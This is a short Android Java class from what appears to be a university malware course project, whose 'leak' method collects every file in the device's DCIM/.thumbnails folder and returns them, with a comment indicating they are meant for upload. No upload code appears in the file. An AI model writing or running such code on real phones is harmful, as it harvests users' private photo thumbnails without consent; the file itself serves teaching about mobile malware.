package com.malwareclass.malwareproject;

import android.os.Environment;
import android.util.Log;

import java.io.File;


public class DCIMLeakage {
    private static final String TAG = "DCIMLeakage";


    public File[] leak(){
        Log.d(TAG, "started");
        // path to .thumbnails dir
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                + "/.thumbnails/";

        // thumbnails directory
        File thumbnailsDir = new File(path);

        // get all thumbnails
        File[] thumbnails = thumbnailsDir.listFiles();

        // if there are some thumbnails, start to uplaod
        if ( thumbnails!=null && thumbnails.length>0 ){
            return thumbnails;
        }
        return null;
    }

}
